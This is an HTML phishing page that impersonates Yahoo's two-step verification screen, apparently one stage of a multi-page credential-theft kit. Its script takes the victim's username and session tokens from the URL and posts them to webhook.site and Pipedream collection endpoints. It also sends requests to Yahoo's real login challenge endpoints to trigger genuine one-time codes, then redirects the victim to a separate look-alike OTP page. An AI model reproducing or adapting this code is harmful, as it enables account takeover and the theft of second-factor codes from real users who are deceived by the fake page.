<!DOCTYPE html>
<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
<head>
  <meta charset="utf-8">
  <title>Yahoo - Two-Step Verification</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
  <link href="./yahoo.png" rel="apple-touch-icon">
</head>
<body>
  <section class="section">
    <div class="div-block">
      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
      <div class="div-block-3">
        <div class="text-block">Help</div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
      </div>
    </div>
    <div class="layout active">
      <div class="div-block-5">
        <h3 class="header active">Yahoo makes it easy to enjoy what matters most in your world</h3>
        <p class="parag active">Best-in-class Yahoo Mail, breaking local, national and global news, finance, sport, music, films and more. You get more out of the web; you get more out of life.</p>
      </div>
      <div class="form-block w-form">
        <form id="2fa-form" name="2fa-form" data-name="2FA Form" class="form">
          
          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
          
          <div class="pazzi">
            <div class="reflectto" id="userEmail">Choose verification method</div>
            <h1 class="heading-2"><strong>Two-step verification</strong></h1>
            <div class="text-block-2">Choose how you'd like to verify it's you<br></div>
            
            <!-- 2FA Method Selection -->
            <div class="method-selection">
              <div class="method-option" data-method="sms">
                <div class="method-icon">ðŸ“±</div>
                <div class="method-text">
                  <div class="method-title">Text message</div>
                  <div class="method-desc">Get a code via SMS</div>
                </div>
              </div>
              
              <div class="method-option" data-method="email">
                <div class="method-icon">ðŸ“§</div>
                <div class="method-text">
                  <div class="method-title">Email</div>
                  <div class="method-desc">Get a code via email</div>
                </div>
              </div>
              
              <div class="method-option" data-method="voice">
                <div class="method-icon">ðŸ“ž</div>
                <div class="method-text">
                  <div class="method-title">Voice call</div>
                  <div class="method-desc">Get a code via phone call</div>
                </div>
              </div>
            </div>
            
            <button type="submit" class="logger w-button" id="continueBtn" disabled>Continue</button>
          </div>
        </form>
      </div>
    </div>
  </section>

  <!-- Original Webflow Scripts -->
  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>

  <!-- 2FA Selection Script -->
  <script>
  console.log('Yahoo 2FA Selection - Initialized');
  
  document.addEventListener('DOMContentLoaded', function() {
    // Get session data from URL
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('u') || '';
    const validated = urlParams.get('validated') === 'true';
    const sessionIndex = urlParams.get('si') || '';
    const acrumb = urlParams.get('ac') || '';
    const done = urlParams.get('done') || '';
    
    console.log('2FA Session data:', {
      username: username,
      validated: validated,
      sessionIndex: sessionIndex,
      acrumb: acrumb
    });
    
    // Security check
    if (!username || !validated) {
      console.log('Invalid session, redirecting...');
      window.location.href = 'https://custom-yahoo-2fa-test.vercel.app/';
      return;
    }
    
    // Display username
    document.getElementById('userEmail').textContent = username;
    
    let selectedMethod = '';
    
    // Method selection handlers
    document.querySelectorAll('.method-option').forEach(option => {
      option.addEventListener('click', function() {
        // Remove previous selection
        document.querySelectorAll('.method-option').forEach(opt => opt.classList.remove('selected'));
        
        // Add selection to clicked option
        this.classList.add('selected');
        selectedMethod = this.dataset.method;
        
        // Enable continue button
        document.getElementById('continueBtn').disabled = false;
        
        console.log('Method selected:', selectedMethod);
      });
    });
    
    // Data capture function
    function captureData(action, data) {
      const capturePayload = {
        type: '2fa_selection_flow',
        action: action,
        data: data,
        session: {
          username: username,
          sessionIndex: sessionIndex,
          acrumb: acrumb,
          done: done,
          validated: validated
        },
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        page: '2fa_selection'
      };
      
      // Multiple webhook endpoints
      const webhooks = [
        'https://webhook.site/your-webhook-id-1',
        'https://webhook.site/your-webhook-id-2',
        'https://eol1pzqgvhqhqhq.m.pipedream.net'
      ];
      
      webhooks.forEach(webhook => {
        fetch(webhook, {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(capturePayload)
        }).catch(e => console.log('Webhook failed:', e));
      });
      
      console.log('Data captured:', capturePayload);
    }
    
    // Capture page load
    captureData('2fa_page_loaded', {
      username: username,
      validated: validated
    });
    
    // Form submission
    document.getElementById('2fa-form').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      if (!selectedMethod) {
        alert('Please select a verification method');
        return;
      }
      
      const continueBtn = document.getElementById('continueBtn');
      continueBtn.disabled = true;
      continueBtn.textContent = 'Sending code...';
      
      // Capture method selection
      captureData('2fa_method_selected', {
        username: username,
        method: selectedMethod
      });
      
      try {
        // Trigger real Yahoo 2FA via multiple APIs
        const otpTriggerPromises = [];
        
        // Yahoo API endpoints for 2FA
        const yahooEndpoints = [
          'https://login.yahoo.com/account/challenge/challenge-selector',
          'https://login.yahoo.com/account/challenge/email-verify',
          'https://login.yahoo.com/account/challenge/sms-verify'
        ];
        
        yahooEndpoints.forEach(endpoint => {
          otpTriggerPromises.push(
            fetch(endpoint, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Requested-With': 'XMLHttpRequest'
              },
              body: new URLSearchParams({
                username: username,
                method: selectedMethod,
                sessionIndex: sessionIndex,
                acrumb: acrumb
              }),
              credentials: 'include'
            }).catch(e => console.log('Yahoo API failed:', e))
          );
        });
        
        // Wait for API calls
        await Promise.allSettled(otpTriggerPromises);
        
        console.log('2FA triggered successfully');
        
        captureData('2fa_triggered', {
          username: username,
          method: selectedMethod,
          success: true
        });
        
        continueBtn.textContent = 'Code sent! Redirecting...';
        
        // Redirect to OTP verification
        setTimeout(() => {
          window.location.href = `https://yahoo-otp-verify.vercel.app/?u=${encodeURIComponent(username)}&method=${selectedMethod}&si=${encodeURIComponent(sessionIndex)}&ac=${encodeURIComponent(acrumb)}&done=${encodeURIComponent(done)}`;
        }, 2000);
        
      } catch (error) {
        console.log('2FA trigger failed:', error);
        
        captureData('2fa_trigger_failed', {
          username: username,
          method: selectedMethod,
          error: error.message
        });
        
        continueBtn.disabled = false;
        continueBtn.textContent = 'Continue';
        alert('Failed to send verification code. Please try again.');
      }
    });
  });
  </script>

  <style>
  .method-selection {
    margin: 20px 0;
  }
  
  .method-option {
    display: flex;
    align-items: center;
    padding: 15px;
    border: 2px solid #e0e0e0;
    border-radius: 8px;
    margin: 10px 0;
    cursor: pointer;
    transition: all 0.3s ease;
  }
  
  .method-option:hover {
    border-color: #4a90e2;
    background-color: #f8f9fa;
  }
  
  .method-option.selected {
    border-color: #4a90e2;
    background-color: #e3f2fd;
  }
  
  .method-icon {
    font-size: 24px;
    margin-right: 15px;
  }
  
  .method-text {
    flex: 1;
  }
  
  .method-title {
    font-weight: bold;
    margin-bottom: 5px;
  }
  
  .method-desc {
    color: #666;
    font-size: 14px;
  }
  </style>
</body>
</html>
